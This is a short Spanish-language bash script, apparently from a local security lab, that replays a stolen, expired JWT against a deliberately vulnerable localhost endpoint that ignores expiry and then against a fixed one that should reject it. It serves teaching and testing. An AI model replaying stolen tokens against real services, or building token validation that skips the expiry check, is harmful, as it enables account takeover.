#!/bin/bash
echo "=== JWT Partial (sin validación exp): Reutilizar token expirado ==="
echo ""
echo "Escenario: el atacante robó un token que ya expiró hace 1 hora."
echo "El servidor usa clave fuerte y rechaza alg=none, pero no valida exp."
echo ""
echo "Obtenemos un token con firma válida y exp en el pasado (simulación de robo):"
EXPIRED=$(curl -s http://localhost:8080/api/auth/forge-expired/2 | python -c "import sys,json; print(json.load(sys.stdin)['forgedToken'])")

echo "Token expirado: ${EXPIRED:0:60}..."
echo ""
echo "Enviamos el token expirado al estado partial-no-exp:"
curl -s -H "X-Auth-Token: $EXPIRED" \
  http://localhost:8080/api/jwt/partial-no-exp/profile | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS (token expirado aceptado — exp ignorado)"
echo ""
echo "Comparación con fixed (debe rechazar el mismo token):"
curl -s -H "X-Auth-Token: $EXPIRED" \
  http://localhost:8080/api/jwt/fixed/profile | python -m json.tool
echo "Resultado esperado: ATTACK_BLOCKED (fixed valida exp correctamente)"
